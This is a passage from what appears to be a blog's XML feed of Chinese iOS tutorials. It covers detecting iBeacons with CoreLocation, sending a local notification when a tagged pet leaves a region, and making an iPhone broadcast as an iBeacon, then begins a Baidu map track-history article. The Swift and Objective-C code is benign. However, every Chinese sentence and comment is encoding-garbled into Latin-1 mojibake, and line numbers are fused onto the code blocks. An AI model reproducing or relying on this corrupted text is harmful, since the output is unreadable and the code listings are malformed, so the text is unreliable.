ä¸ºæ¶‰åŠåˆ°Appleçš„ç§æœ‰apiï¼Œæ˜¯ä¸å…è®¸ä¸Šæž¶App Storeçš„ã€‚ æƒ³äº†è§£iBeaconåº•å±‚æ•°æ®åè®®æ ¼å¼çš„ï¼Œå¯ä»¥å‚è€ƒWhat is the iBeacon Bluetooth Profile è¿™ç¯‡æ–‡ç« ã€‚ åˆå§‹åŒ– åœ¨ iOS8.0ä¹‹åŽçš„æ—¶å€™å¦‚æžœæƒ³ä½¿ç”¨iBeaconï¼Œå¿…é¡»è®©ç”¨æˆ·æŽˆæƒ åœ¨info.plistæ–‡ä»¶é‡Œé¢é…ç½®ä¸‹é¢çš„key 123NSLocationAlwaysAndWhenInUseUsageDescription // æŽ¨èNSLocationWhenInUseUsageDescriptionNSLocationAlwaysUsageDescription åœ¨capabilitiesé‡Œé¢å¼€å¯Background Modesçš„ Location updates ç”±äºŽiBeaconæ˜¯åŸºäºŽCoreLocationæ¡†æž¶çš„ï¼Œæ‰€ä»¥å…ˆå¯¼å…¥å¤´æ–‡ä»¶å¹¶å®žä¾‹åŒ–ä½ç½®ç®¡ç†è€… 12import CoreLocationlet locationManager = CLLocationManager() è¯·æ±‚æŽˆæƒå¹¶è®¾ç½®ä»£ç† 12345678override func viewDidLoad()&#123; super.viewDidLoad() // Do any additional setup after loading the view. locationManager.requestAlwaysAuthorization() // å¿…é¡»è¦ç”³è¯·æƒé™,å¦è€…ä¸ä¼šå›žè°ƒæ‰«æåˆ°beaconsçš„ä»£ç†æ–¹æ³• locationManager.delegate = self&#125; æ·»åŠ éœ€è¦ç›‘å¬çš„iBeacon è¿™ä¸ªæ˜¯æ·»åŠ iBeaconä¿¡æ¯ç•Œé¢ä»£ç†å›žè°ƒ 123456789101112131415// MARK: AddBeaconextension ItemsViewController: AddBeacon &#123; func addBeacon(item: Item) &#123; items.append(item) tableView.beginUpdates() let newIndexPath = IndexPath(row: items.count - 1, section: 0) tableView.insertRows(at: [newIndexPath], with: .automatic) tableView.endUpdates() startMonitoring(item) // å¼€å§‹ç›‘æŽ§ persistItems() // æŒä¹…åŒ–åˆ°æœ¬åœ° &#125;&#125; Itemä¸ºä¸€ä¸ªiBeaconä¿¡æ¯çš„æ•°æ®æ¨¡åž‹, å³åŒ…å«å¦‚ä¸‹ä¿¡æ¯ 12345let name: String // éžå¿…é¡»let icon: Int // éžå¿…é¡»let uuid: UUIDlet majorValue: CLBeaconMajorValue // éžå¿…é¡»let minorValue: CLBeaconMinorValue // éžå¿…é¡» å¼€å§‹ç›‘å¬å’Œåœæ­¢ç›‘å¬ æ ¹æ®ä¸€ä¸ªiBeaconçš„å‚æ•°ï¼ˆiBeaconç¡¬ä»¶æä¾›æˆ–è€…è‡ªå·±ç”¨iPhoneæˆ–è€…macæ¨¡æ‹Ÿï¼‰åˆå§‹åŒ–ä¸€ä¸ªCLBeaconRegion ä¸¤ç§ç›‘å¬æ¨¡å¼ 123456789101112func startMonitoring(_ item: Item)&#123; let region = item.asBeaconRegion() locationManager.startMonitoring(for: region) // ä½ŽåŠŸè€—ï¼Œæ”¯æŒåŽå°ç›‘å¬ locationManager.startRangingBeacons(in: region) // å¤§åŠŸè€—ï¼Œä¸æ”¯æŒåŽå°ç›‘å¬&#125;// MARK: æ ¹æ®æ¨¡åž‹æ•°æ®åˆå§‹åŒ–ä¸€ä¸ªBeacon Regionfunc asBeaconRegion() -&gt; CLBeaconRegion &#123; return CLBeaconRegion(proximityUUID: uuid, major: majorValue, minor: minorValue, identifier: name)&#125; å¦‚æžœæƒ³åœæ­¢ç›‘å¬æŸä¸ªiBeacon 123456func stopMonitoring(_ item: Item)&#123; let region = item.asBeaconRegion() locationManager.stopMonitoring(for: region) locationManager.stopRangingBeacons(in: region)&#125; ç›‘å¬åˆ°iBeaconä¿¡æ¯å›žè°ƒ å¼€å§‹ç›‘å¬æŸä¸ªBeacon 1234func locationManager(_ manager: CLLocationManager, didStartMonitoringFor region: CLRegion)&#123; print("didStartMonitoringFor\(region)")&#125; ç›‘å¬åˆ°Beacons 12345678910111213141516171819202122232425// MARK: CLLocationManagerDelegateextension ItemsViewController: CLLocationManagerDelegate &#123; func locationManager(_ manager: CLLocationManager, didRangeBeacons beacons: [CLBeacon], in region: CLBeaconRegion) &#123; print("didRangeBeacons \(beacons.count)ä¸ª") var indexPaths = [IndexPath]() for beacon in beacons &#123; for row in 0..&lt;items.count &#123; // æ£€æµ‹æ˜¯å¦æ˜¯éœ€è¦ç›‘æŽ§çš„beacon if items[row] == beacon &#123; items[row].beacon = beacon indexPaths += [IndexPath(row: row, section: 0)] &#125; &#125; &#125; if let visiblaRows = tableView.indexPathsForVisibleRows &#123; let rowsToUpdate = visiblaRows.filter&#123; indexPaths.contains($0) &#125; for row in rowsToUpdate &#123; // åˆ·æ–°å¯è§cellä¸Šå¯¹åº”çš„Beaconè·ç¦»ä¿¡æ¯ let cell = tableView.cellForRow(at: row) as? ItemCell cell?.refreshLocation() &#125; &#125; &#125; å…¶ä»–çš„å›žè°ƒæ–¹æ³• æ³¨æ„ï¼š å¦‚æžœéœ€è¦ç›‘å¬è¿›å…¥æŸä¸ªåŒºåŸŸæˆ–è€…ä»ŽæŸä¸ªåŒºåŸŸç¦»å¼€ï¼Œåˆ™éœ€è¦åœ¨åˆå§‹åŒ–Beacon Regionçš„æ—¶å€™è®¢é˜… ä¸ç„¶è¿›å…¥å’Œç¦»å¼€åŒºåŸŸä¸å›žå›žè°ƒ 12&gt; region.notifyOnEntry = YES; &gt; region.notifyOnExit = YES; 1234567891011121314151617181920212223// monitoring ç›‘å¬æŸä¸ªbeaconå¤±è´¥ func locationManager(_ manager: CLLocationManager, monitoringDidFailFor region: CLRegion?, withError error: Error)&#123; print("Failed monitoring region\(error.localizedDescription)")&#125;// ä½ç½®ç®¡ç†è€…å‡ºçŽ°é”™è¯¯ä¿¡æ¯ func locationManager(_ manager: CLLocationManager, didFailWithError error: Error)&#123; print("Location manager failed \(error.localizedDescription)")&#125;// ranging ç›‘å¬æŸä¸ªbeaconå¤±è´¥ func locationManager(_ manager: CLLocationManager, rangingBeaconsDidFailFor region: CLBeaconRegion, withError error: Error)&#123; print("rangingBeaconsDidFailFor")&#125;// å·²ç»è¿›å…¥åˆ°æŸä¸ªåŒºåŸŸ func locationManager(_ manager: CLLocationManager, didEnterRegion region: CLRegion) &#123; print("didEnterRegion")&#125;// å·²ç»ä»ŽæŸä¸ªåŒºåŸŸç¦»å¼€ func locationManager(_ manager: CLLocationManager, didExitRegion region: CLRegion) &#123; print("didExitRegion")&#125; å…³äºŽæŽ¨é€ appçŽ°åœ¨èƒ½æ˜¾ç¤ºiBeaconè®¾å¤‡ï¼Œå¹¶ä¸”è¿˜èƒ½å®žæ—¶ç›‘æŽ§å®ƒä»¬çš„è·ç¦»ã€‚ä½†æ˜¯å½“appæ²¡æœ‰å¤„äºŽè¿è¡ŒçŠ¶æ€æ—¶ï¼Œå¦‚iBeaconè®¾å¤‡åœ¨å® ç‰©çŒ«è„–å­ä¸Šä½†æ˜¯å® ç‰©çŒ«è·‘ä¸¢äº†ï¼ æ­¤æ—¶appå°±éœ€è¦åœ¨çŒ«ç¦»å¼€åŒºåŸŸçš„æ—¶å€™é€šçŸ¥ç”¨æˆ·ã€‚ åœ¨AppDelegateå¯¼å…¥é€šçŸ¥æ¡†æž¶å¹¶åˆå§‹åŒ–ä¸€ä¸ªä½ç½®ç®¡ç†è€… 1234import CoreLocationimport UserNotificationsvar locationManager = CLLocationManager() ç¨‹åºå¯åŠ¨çš„æ—¶å€™ï¼Œé…ç½®ä½ç½®ç›‘å¬å’Œè®¾ç½®é€šçŸ¥ 123456789101112func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplicationLaunchOptionsKey: Any]?) -&gt; Bool &#123; // Override point for customization after application launch. // æ³¨å†Œé€šçŸ¥ï¼Œè¯·æ±‚æƒé™ let center = UNUserNotificationCenter.current() center.requestAuthorization(options: [.alert, .sound]) &#123; (granted, error) in &#125; // è®¾ç½®ä»£ç† locationManager.delegate = self return true&#125; ç›‘å¬ç›®æ ‡ç¦»å¼€åŒºåŸŸå¹¶å‘é€æœ¬åœ°é€šçŸ¥ 123456789101112131415extension AppDelegate: CLLocationManagerDelegate&#123; func locationManager(_ manager: CLLocationManager, didExitRegion region: CLRegion) &#123; guard region is CLBeaconRegion else &#123; return &#125; let content = UNMutableNotificationContent() content.title = "Forget Me Not" content.body = "Are you forgetting something?" content.sound = .default() let request = UNNotificationRequest(identifier: "iBeaconDemo", content: content, trigger: nil) UNUserNotificationCenter.current().add(request, withCompletionHandler: nil) &#125;&#125; å‚è€ƒå®˜æ–¹æ–‡æ¡£ç»´åŸºç™¾ç§‘iOS ä¸­ iBeacon å¼€å‘iBeacon Tutorial with iOS and SwiftHow to detect ibeacon device without knowing UUID in iOS?Detecting beacons via iBeacon Monitoring &amp; Ranging vs CoreBluetooth scanForPeripheralsWithServices]]></content>
      <categories>
        <category>iOS</category>
        <category>è“ç‰™</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>è“ç‰™</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSè“ç‰™å¼€å‘ä¹‹iBeaconç¯‡(ä¸€)]]></title>
    <url>%2Farchives%2F1f6c5df3.html</url>
    <content type="text"><![CDATA[é«˜å±±æœ‰å´–, æž—æœ¨æœ‰æžã€‚å¿§æ¥æ— æ–¹, äººèŽ«ä¹‹çŸ¥ã€‚â€”â€”æ›¹ä¸•ã€Šå–„å“‰è¡Œã€‹ ä»€ä¹ˆæ˜¯iBeacon å¦‚æžœåªæ˜¯éœ€è¦iPhoneæ¨¡æ‹ŸiBeaconçš„demoä»£ç ï¼Œå¯ä»¥ç‚¹å‡»ä¸‹è½½ï¼Œä¸éœ€è¦å¾€ä¸‹çœ‹äº†ðŸ˜‚ ä½ æ›¾ç»æƒ³è¿‡ç”¨æ‰‹æœºåœ¨ä¸€ä¸ªå¤§åž‹å»ºç­‘ç‰©ä¸­ä¸ºè‡ªå·±å®šä½å—ï¼Œæ¯”å¦‚è´­ç‰©ä¸­å¿ƒï¼Œæˆ–è€…åšç‰©é¦†ã€‚ å½“ç„¶ï¼ŒGPSå¯ä»¥è®©ä½ å¾—çŸ¥è‡ªå·±èº«å¤„å“ªä¸€åº§å»ºç­‘ç‰©é‡Œã€‚ä½†æ˜¯å¦‚æžœæƒ³è¦åœ¨è¿™äº›é’¢ç­‹æ··å‡åœŸå †ç Œè€Œæˆçš„å»ºç­‘ä¸­èŽ·å¾—ç²¾ç¡®çš„GPSä¿¡å·ï¼Œåªèƒ½ç¥ä½ å¥½è¿äº†ã€‚ä½ æ‰€éœ€è¦çš„æ˜¯å†…ç½®åœ¨å»ºç­‘ç‰©ä¸­ä¸€äº›è®¾å¤‡ï¼Œï¼ˆé€šè¿‡å®ƒä»¬ï¼‰è®©æ‰‹æœºèŽ·å–ç¡®å®šä½ çš„ä½ç½®ã€‚ iBeaconæ˜¯Appleå…¬å¸å¼€å‘çš„ä¸€ç§è¿‘åœºé€šè®¯åè®®ï¼ŒäºŽ2013å¹´çš„WWDCå¼€å‘è€…å¤§ä¼šæŽ¨å‡ºã€‚å½“ä½ çš„æ‰‹æŒè®¾å¤‡é è¿‘ä¸€ä¸ªBeaconåŸºç«™æ—¶ï¼Œè®¾å¤‡å°±èƒ½å¤Ÿæ„Ÿåº”åˆ°Beaconä¿¡å·ï¼ŒèŒƒå›´å¯ä»¥ä»Žå‡ æ¯«ç±³åˆ°50ç±³ã€‚å› ä¸ºæ˜¯ä¸€ç§å®šä½æŠ€æœ¯ï¼Œè‹¹æžœå°†iBeaconç›¸å…³çš„æŽ¥å£æ”¾åˆ°äº†CoreLocation.frameworkã€‚ å…¶å·¥ä½œæ–¹å¼æ˜¯: é…å¤‡æœ‰ä½ŽåŠŸè€—è“ç‰™ï¼ˆBLEï¼‰é€šä¿¡åŠŸèƒ½çš„è®¾å¤‡(iBeacon)ä½¿ç”¨BLEæŠ€æœ¯å‘å‘¨å›´å‘é€è‡ªå·±ç‰¹æœ‰çš„UUIDï¼Œä½¿ç”¨iBeaconçš„AppæŽ¥æ”¶åˆ°è¯¥UUIDçš„åº”ç”¨è½¯ä»¶ä¼šæ ¹æ®è¯¥UUIDé‡‡å–ä¸€äº›è¡ŒåŠ¨ã€‚ iBeaconçš„åº”ç”¨åœºæ™¯ å½“ä½¿ç”¨è€…èµ°è¿›æŸä¸ªåšç‰©é¦†æ—¶ï¼Œä¼šæ‰«æåˆ°ä¸€ä¸ª beaconã€‚è¿™ä¸ª beacon æœ‰ä¸‰ä¸ªæ ‡å¿—ç¬¦ proximityUUID æ˜¯ä¸€ä¸ªæ•´ä¸ªåšç‰©é¦†ç»Ÿä¸€çš„å€¼ï¼Œå¯ä»¥ç”¨æ¥æ ‡è¯†è¿™ä¸ªåšç‰©é¦† major å€¼ç”¨æ¥æ ‡è¯†ç‰¹å®šçš„å±•é¦†ï¼Œæ¯”å¦‚å”ä»£å±•é¦†ï¼Œæ±‰ä»£å±•é¦†ç­‰ç­‰ minor å€¼æ ‡è¯†äº†ç‰¹å®šçš„ä¸€ä¸ªä½ç½®çš„ beaconï¼Œä¾‹å¦‚å®šä½åˆ°ä½¿ç”¨è€…æ­£åœ¨å”ä»£å±•é¦†çš„å”ä¸‰å½©å±•å“çš„ä½ç½®ã€‚ è¿™æ—¶åšç‰©é¦†çš„ app ä¼šè¢«ç³»ç»Ÿå”¤é†’ï¼Œapp å¯ä»¥è¿è¡Œä¸€ä¸ªæ¯”è¾ƒçŸ­çš„æ—¶é—´ã€‚åœ¨è¿™æ®µæ—¶é—´å†…ï¼Œapp å¯ä»¥æ ¹æ® beacon çš„å±žæ€§æŸ¥è¯¢åˆ°ä½¿ç”¨è€…çš„åœ°ç†ä½ç½®ï¼ˆé€šè¿‡æŸ¥è¯¢æœåŠ¡å™¨æˆ–è€…æœ¬åœ°æ•°æ®ï¼‰ ä¾‹å¦‚åœ¨å”ä»£å±•é¦†çš„å”ä¸‰å½©å±•å“ä½ç½®ï¼Œä¹‹åŽå°±å¯ä»¥é€šè¿‡ä¸€ä¸ª local notification æŽ¨é€è¿™ä»¶å±•å“çš„ç®€ä»‹ã€‚ç”¨æˆ·å¯ä»¥ç‚¹å‡»è¿™æ¬¡ local notification æ¥æŸ¥çœ‹æ›´è¯¦ç»†çš„ä¿¡æ¯ï¼Œè¿™æ ·ä¸€æ¬¡å¯¼è§ˆè¡Œä¸ºå°±å®Œæˆäº†ã€‚ å¯ä»¥å……å½“iBeaconçš„iOSçš„è®¾å¤‡ iPhone4s æˆ–è€… ä¹‹åŽçš„iPhoneè®¾å¤‡ ç¬¬ä¸‰ä»£iPadæˆ–è€… ä¹‹åŽiPadè®¾å¤‡ iPad mini æˆ–è€… ä¹‹åŽiPad miniè®¾å¤‡ ç¬¬äº”ä»£iPod touch æˆ–è€…ä¹‹åŽiPod touchè®¾å¤‡ iMac æˆ–è€… MacBookPro iBeaconç›‘å¬æ–¹å¼ Monitoringï¼šä½ŽåŠŸè€—ç›‘å¬ï¼Œç”¨æ¥åˆ¤æ–­è®¾å¤‡è¿›å‡ºibeaconå›´æ ï¼Œæ”¯æŒåŽå°æˆ–appè¿›ç¨‹æ€æŽ‰åŽç›‘å¬ã€‚ Rangingï¼šå¤§åŠŸçŽ‡ç›‘å¬ï¼Œç›‘å¬å½“å‰è®¾å¤‡æ‰€åœ¨åŒºåŸŸå†…çš„ibeaconä¿¡æ¯ï¼ŒåŒ…æ‹¬rssiï¼Œè·ç¦»ï¼Œä¸æ”¯æŒåŽå°ç›‘å¬ã€‚ åŸºäºŽè¿™ä¸¤ä¸ªç‰¹æ€§ï¼Œæˆ‘ä»¬åœ¨ä½¿ç”¨æ—¶å°±åˆ†ä¸ºå‰å°å’ŒåŽå°ä¸¤ä¸ªåœºæ™¯æ¥å®žçŽ°ibeaconçš„æ£€æµ‹ã€‚ iBeaconç›‘å¬ ä½ çš„è®¾å¤‡å½“ç„¶ä¸ä¼šè‡ªåŠ¨ç›‘æµ‹iBeaconçš„ï¼Œæ‰€ä»¥é¦–å…ˆä½ å¾—å‘ŠçŸ¥å®ƒã€‚CLBeaconRegionç±»ä»£è¡¨ä¸€ä¸ªiBeaconã€‚ iBeaconä¸ŽCore Locationå…³è”åœ¨ä¸€èµ·çœ‹ä¸ŠåŽ»æœ‰ç‚¹å¥‡æ€ªï¼Œå› ä¸ºå®ƒå°±æ˜¯ä¸€ä¸ªè“ç‰™è®¾å¤‡è€Œå·²ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥è¿™ä¹ˆè®¤ä¸ºï¼Œé‚£å°±æ˜¯iBeaconæä¾›å°èŒƒå›´å®šä½åŠŸèƒ½ï¼Œè€ŒGPSæä¾›çš„æ˜¯å¤§èŒƒå›´å®šä½åŠŸèƒ½ã€‚ CLBeaconRegionå‚æ•°ä»‹ç» å‚æ•° å¿…è¦å­—æ®µ ä½œç”¨ identifier æ˜¯ æ ‡è¯†å­—ç¬¦ä¸² proximityUUID æ˜¯ ä¸€çº§æ ‡è¯†ï¼ˆeg.æ ‡è¯†å…¬å¸ï¼‰ major å¦ äºŒçº§æ ‡è¯†ï¼ˆeg.æ ‡è¯†åº—é“ºï¼‰ minor å¦ ä¸‰çº§æ ‡è¯†ï¼ˆeg.æ ‡è¯†ä½ç½®ï¼‰ æ‰‹æœºæ¨¡æ‹ŸiBeacon å½“æƒ³è®©iOSè®¾å¤‡å……å½“iBeaconæ—¶ï¼Œä½ è¿˜éœ€è¦å¼•å…¥Core Bluetoothæ¡†æž¶ï¼Œä½†åªæƒ³æ£€æµ‹iBeaconè®¾å¤‡ï¼Œä½ åªéœ€è¦Core Locationå°±è¡Œäº†ã€‚ åˆå§‹åŒ– åˆå§‹åŒ–é…ç½®ä¸€ä¸ªiBeaconçš„å‚æ•° beaconUUID æ˜¯ä¸€ä¸ª128ä½çš„å€¼ï¼Œå¯ä»¥ä½¿ç”¨uuidgenç”Ÿæˆï¼Œä½†æ˜¯ç”Ÿæˆçš„æŸäº›å€¼ä¸å¯ç”¨ï¼ŒæŽ¨èä½¿ç”¨æˆ‘æä¾›çš„è¿™ä¸ª åˆå§‹åŒ–ä¸€ä¸ªè“ç‰™å¤–è®¾ç®¡ç†è€…ï¼Œ 12345678910111213private let beaconIdentity = "kitty"private let beaconUUID = "B0702880-A295-A8AB-F734-031A98A512DE"private let beaconMajorValue = UInt16(2)private let beaconMinorValue = UInt16(7)private var peripheraManager: CBPeripheralManager?override func viewDidLoad() &#123; super.viewDidLoad() // Do any additional setup after loading the view, typically from a nib. peripheraManager = CBPeripheralManager(delegate: self, queue: .main)&#125; ç›‘å¬è“ç‰™çŠ¶æ€æ”¹å˜ åœ¨inof.plistæ–‡ä»¶é…ç½®Privacy - Bluetooth Peripheral Usage Descriptionè¯·æ±‚è“ç‰™æŽˆæƒ éµå®ˆCBPeripheralManagerDelegateåè®® 123456789101112131415161718192021extension ViewController: CBPeripheralManagerDelegate&#123; func peripheralManagerDidUpdateState(_ peripheral: CBPeripheralManager) &#123; switch peripheral.state &#123; case .unknown: print("è“ç‰™æœªçŸ¥çš„") case .resetting: print("è“ç‰™é‡ç½®ä¸­") case .unsupported: print("è“ç‰™ä¸æ”¯æŒ") case .unauthorized: print("è“ç‰™æœªéªŒè¯") case .poweredOff: print("è“ç‰™æœªå¯åŠ¨") case .poweredOn: print("è“ç‰™å¯ç”¨") beaconAdvertising() &#125; &#125;&#125; é…ç½®æ¨¡æ‹ŸiBeaconå¹¿æ’­æ•°æ®1234567891011func beaconAdvertising() &#123; guard let uuid = UUID(uuidString: beaconUUID) else &#123; return &#125; let region = CLBeaconRegion(proximityUUID: uuid, major: beaconMajorValue, minor: beaconMinorValue, identifier: beaconIdentity) let regionData = region.peripheralData(withMeasuredPower: nil) let regionAdvertising = regionData as? [String : Any] peripheraManager?.startAdvertising(regionAdvertising) print("å¼€å§‹æ¨¡æ‹ŸBeaconå¹¿æ’­æ•°æ®\(regionData)")&#125; ç›‘å¬æ˜¯å¦å¹¿æ’­æˆåŠŸ è‹¥å¹¿æ’­æˆåŠŸï¼Œåˆ™å¯ä½œä¸ºiBeaconä½¿ç”¨ éœ€è¦ç›‘å¬iBeaconå¯å‚è€ƒiOSè“ç‰™å¼€å‘ä¹‹iBeaconç¯‡(äºŒ) 12345func peripheralManagerDidStartAdvertising(_ peripheral: CBPeripheralManager, error: Error?) &#123; print("æ­£åœ¨æ¨¡æ‹ŸBeaconå¹¿æ’­æ•°æ®: \(peripheral.isAdvertising) --- é”™è¯¯ä¿¡æ¯: \(String(error?.localizedDescription ?? "æ— "))") stateLbl.text = "æ­£åœ¨æ¨¡æ‹ŸBeaconå¹¿æ’­æ•°æ®: \n\(peripheral.isAdvertising) \né”™è¯¯ä¿¡æ¯: \n\(String(error?.localizedDescription ?? "æ— "))" stateLbl.textAlignment = .center&#125; å‚è€ƒå®˜æ–¹æ–‡æ¡£ç»´åŸºç™¾ç§‘iOS ä¸­ iBeacon å¼€å‘]]></content>
      <categories>
        <category>iOS</category>
        <category>è“ç‰™</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>è“ç‰™</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSå¼€å‘ä¹‹åœ°å›¾ç¯‡(ä¸‰):åŽ†å²è½¨è¿¹è®°å½•]]></title>
    <url>%2Farchives%2Fb47045de.html</url>
    <content type="text"><![CDATA[æœˆè½ä¹Œå•¼éœœæ»¡å¤©ï¼Œæ±Ÿæž«æ¸”ç«å¯¹æ„çœ ã€‚å§‘è‹åŸŽå¤–å¯’å±±å¯ºï¼Œå¤œåŠé’Ÿå£°åˆ°å®¢èˆ¹ã€‚ å‰è¨€ æ€ è€ƒ è¦ æ€Ž ä¹ˆ å¼€ å§‹ ã€‚ã€‚ã€‚ å—¯ (è¿‡äº†ä¸€ä¸‡å¹´ã€‚ã€‚ã€‚) æœ€è¿‘ä¸€ç›´åœ¨åšä¸€ä¸ªå® ç‰©å®šä½çš„é¡¹ç›®ï¼Œæœ¬æ¥ä»¥ä¸ºåªéœ€è¦å‚è€ƒå®˜æ–¹æ–‡æ¡£æŽ¥å…¥åœ°å›¾å®žçŽ°åŠŸèƒ½å°±å¯ä»¥winner winner chicken dinneräº†ï¼Œä½†æ˜¯ç­‰åˆ°æˆ‘æŽ‰ä»¥è½»å¿ƒçš„åšåˆ°åŽé¢å†åŠ ä¸ŠåŽ†å²è½¨è¿¹ç–¯ç‹‚æ”¹éœ€æ±‚çš„æ—¶å€™ï¼ŒåˆåŒå’å•åŠ ä¸Šè¿˜è¦ç™¾åº¦å’Œè°·æ­ŒåŒæ­¥å®žçŽ°åŠŸèƒ½ï¼Œå¿ƒä¸­å¼€å§‹æœ‰ä¸€ä¸‡åªç¥žå…½åœ¨å¥”è…¾ï¼ŒäºŽæ˜¯ã€ã€å°±æœ‰äº†è¿™ç¯‡æ–‡ç« çš„ç”±æ¥äº†ã€‚ å…³äºŽåŽ†å²è½¨è¿¹ è¡¥ä¸€å¼ æ•ˆæžœå›¾ åŽ†å²è½¨è¿¹åŽ†ç»äº†å¥½å‡ ä¸ªç‰ˆæœ¬çš„åœ¨å‡ ä¸ªæ–¹æ¡ˆä¹‹é—´æ¥å›žæ‹‰é”¯ï¼ŒçŽ°åœ¨ç»ˆäºŽæ˜¯ã€‚ã€‚ã€‚è¿˜æ²¡æœ‰å®šä¸‹æ¥å…·ä½“çš„æ–¹æ¡ˆäº†ðŸ¤£ æ–¹æ¡ˆä¸€ï¼šé€‰æ—¶é—´æ®µæŸ¥è¯¢åŽ†å²è½¨è¿¹æ•°æ®åŽå…¨éƒ¨æ˜¾ç¤ºåœ¨åœ°å›¾ä¸Šé¢ï¼Œç„¶åŽå¯ä»¥ç‚¹å‡»æ’­æ”¾æŒ‰é’®å›žæ”¾åŽ†å²è½¨è¿¹å¹¶ç”»çº¿ï¼›æˆ–è€…æ‹–åŠ¨ä¸€ä¸ªUISlideBaræ»‘åŠ¨æ¡å¯ä»¥åˆ‡æ¢æ¯ä¸€è½¨è¿¹ç‚¹å¹¶æ˜¾ç¤ºè½¨è¿¹è¯¦ç»†ä¿¡æ¯å¼¹æ¡†ã€‚ æ–¹æ¡ˆäºŒï¼šé€‰æ—¶é—´æ®µæŸ¥è¯¢åŽ†å²è½¨è¿¹æ•°æ®åŽæ˜¾ç¤ºç¬¬ä¸€ä¸ªç‚¹åœ¨åœ°å›¾ä¸Šé¢ï¼Œç„¶åŽå¯ä»¥é€šè¿‡å››ä¸ªæ“ä½œæŒ‰é’®ï¼ˆèµ·ç‚¹ï¼Œä¸Šä¸€ä¸ªï¼Œä¸‹ä¸€ä¸ªï¼Œç»ˆç‚¹ï¼‰åˆ‡æ¢è½¨è¿¹ç‚¹ç”»çº¿å¹¶æ˜¾ç¤ºè½¨è¿¹è¯¦ç»†ä¿¡æ¯å¼¹æ¡†ï¼›æˆ–è€…æ‰‹åŠ¨ç‚¹å‡»åˆ‡æ¢æ¯ä¸€è½¨è¿¹ç‚¹å¹¶æ˜¾ç¤ºè½¨è¿¹è¯¦ç»†ä¿¡æ¯å¼¹æ¡†ã€‚ æ–¹æ¡ˆä¸‰ï¼šé€‰æ—¶é—´æ®µæŸ¥è¯¢åŽ†å²è½¨è¿¹æ•°æ®åŽå…¨éƒ¨æ˜¾ç¤ºåœ¨åœ°å›¾ä¸Šé¢ï¼Œç„¶åŽå¯ä»¥é€šè¿‡å››ä¸ªæ“ä½œæŒ‰é’®ï¼ˆèµ·ç‚¹ï¼Œä¸Šä¸€ä¸ªï¼Œä¸‹ä¸€ä¸ªï¼Œç»ˆç‚¹ï¼‰åˆ‡æ¢è½¨è¿¹ç‚¹å¹¶æ˜¾ç¤ºè½¨è¿¹è¯¦ç»†ä¿¡æ¯å¼¹æ¡†ï¼›æˆ–è€…æ‰‹åŠ¨ç‚¹å‡»åˆ‡æ¢æ¯ä¸€è½¨è¿¹ç‚¹å¹¶æ˜¾ç¤ºè½¨è¿¹è¯¦ç»†ä¿¡æ¯å¼¹æ¡†ã€‚ æ–¹æ¡ˆå››äº”å…­ä¸ƒå…«ä¹â€¦å¾…å®¢æˆ·å’Œè€æ¿å®šã€‚ é—®é¢˜ æ–¹æ¡ˆä¸€ï¼šæŸ¥è¯¢è½¨è¿¹è¿‡å¤šå¯¼è‡´èŽ·å–æ•°æ®æ¯”è¾ƒè€—æ—¶ï¼Œæ˜¾ç¤ºç‚¹æ¯”è¾ƒå¤šç”»çº¿ä¹±ã€‚ æ–¹æ¡ˆäºŒï¼šç­›é€‰æ‰€é€‰æ—¶é—´æ®µçš„ä¼°è®¡ç‚¹ï¼ˆæŠ½å–å¹³å‡10ä¸ªç‚¹å‡ºæ¥ï¼ŒåŽæ¥åˆæ”¹ä¸º5ä¸ªï¼Œåœ¨åœ¨åŽæ¥æ”¹ä¸ºæœåŠ¡å™¨é…ç½®ï¼‰ï¼Œç”»çº¿åŠŸèƒ½ç”±æœåŠ¡å™¨é…ç½®ï¼Œé€‰æ‹©æ—¶é—´æ®µé—´éš”æœåŠ¡å™¨é…ç½®ã€‚ æ–¹æ¡ˆä¸‰ï¼šåœ¨æ–¹æ¡ˆäºŒçš„åŸºç¡€ä¸Šï¼Œåˆ†é¡µèŽ·å–æ‰€æœ‰æ•°æ®å¹¶å…¨éƒ¨æ˜¾ç¤º æ–¹æ¡ˆå››äº”å…­ä¸ƒå…«ä¹â€¦æœªçŸ¥ ç™¾åº¦åœ°å›¾åŽ†å²è½¨è¿¹å¼€å§‹æŒ–å‘ åŽ†å²å¤è¿¹æ— éžå°±æ˜¯å¤šä¸ªä½ç½®ç‚¹æž„æˆï¼Œæ‰€ä»¥å’Œä¸Šä¸€ç¯‡çš„æ·»åŠ åæ ‡ç‚¹å¤§å¤´é’ˆä¸€æ ·ï¼Œåªæ˜¯æ·»åŠ å¤šä¸ªè€Œå·²ï¼Œè€ƒè™‘åˆ°æŽ§ä»¶çš„é‡ç”¨æœºåˆ¶ï¼Œæ‰€ä»¥æœ‰äº†ä¸‹é¢çš„ä»£ç  1234567891011121314151617181920212223242526// ... éåŽ†åŽ†å²å¤è¿¹æ•°æ® åˆ›å»ºåœ°å›¾å¤§å¤´é’ˆ// ... å¯¹æ¯ä¸€ä¸ªåæ ‡ååœ°ç†ç¼–ç // ... åœ¨ååœ°ç†ç¼–ç é‡Œé¢åˆ·æ–°å¯¹åº”çš„æ¨¡åž‹ä¿¡æ¯åœ°å€ å¹¶åˆ·æ–°è‡ªå®šä¹‰å¼¹æ¡†paopaoView- (BMKAnnotationView *)mapView:(BMKMapView *)mapView viewForAnnotation:(id &lt;BMKAnnotation&gt;)annotation&#123; if (![annotation isKindOfClass:[XSPointAnnotation class]]) &#123; // ä¸æ˜¯è‡ªå®šä¹‰å¤§å¤´é’ˆæ¨¡åž‹ return nil; &#125; BMKAnnotationView *annotationView = nil; XSPointAnnotation *customAnnotation = (XSPointAnnotation *)annotation; if (customAnnotation.annotationType == XSAnnotationTypeLocationPoint) &#123; // å½“å‰ä½ç½®ç‚¹ç±»åž‹ annotationView = [mapView dequeueReusableAnnotationViewWithIdentifier:@"LocationAnnotation"]; if (annotationView == nil) &#123; annotationView = [[BMKPinAnnotationView alloc] initWithAnnotation:customAnnotation reuseIdentifier:@"LocationAnnotation"]; &#125; annotationView.image = [UIImage imageNamed:[customAnnotation.locationDetailsModel.deviceBindingTypeImageName stringByAppendingString:@"_small"]]; annotationView.draggable = NO; annotationView.canShowCallout = YES; self.petAnnotationView.locationDetails = customAnnotation.locationDetailsModel; self.petAnnotationView.isHiddenNoNeeds = 